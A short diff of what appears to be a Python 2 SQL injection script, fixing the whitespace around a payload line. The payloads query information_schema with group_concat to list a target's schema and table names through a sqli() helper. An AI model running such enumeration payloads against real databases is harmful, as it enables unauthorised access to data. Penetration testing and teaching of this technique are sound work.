@@ -61,7 +61,8 @@ if options.database:
         payload = "select group_concat(schema_name) from information_schema.schemata limit 1"
         print sqli(payload)
 
-if options.table:                                                                                                                                                                                                                                    payload = "select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1"
+if options.table:
+        payload = "select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1"
         print sqli(payload)
 
 if options.column:
